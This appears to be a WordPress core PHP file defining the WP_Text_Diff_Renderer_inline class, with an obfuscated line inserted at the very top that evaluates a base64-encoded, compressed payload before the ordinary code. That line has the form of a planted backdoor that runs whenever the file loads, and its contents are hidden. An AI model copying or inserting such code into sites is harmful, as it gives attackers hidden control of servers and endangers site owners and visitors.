<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Diff API: WP_Text_Diff_Renderer_inline class
 *
 * @package WordPress
 * @subpackage Diff
 * @since 4.7.0
 */

/**
 * Better word splitting than the PEAR package provides.
 *
 * @since 2.6.0
 * @uses Text_Diff_Renderer_inline Extends
 */
class WP_Text_Diff_Renderer_inline extends Text_Diff_Renderer_inline {

	/**
	 * @ignore
	 * @since 2.6.0
	 *
	 * @param string $string
	 * @param string $newlineEscape
	 * @return string
	 */
	public function _splitOnWords($string, $newlineEscape = "\n") {
		$string = str_replace("\0", '', $string);
		$words  = preg_split( '/([^\w])/u', $string, -1, PREG_SPLIT_DELIM_CAPTURE );
		$words  = str_replace( "\n", $newlineEscape, $words );
		return $words;
	}

}
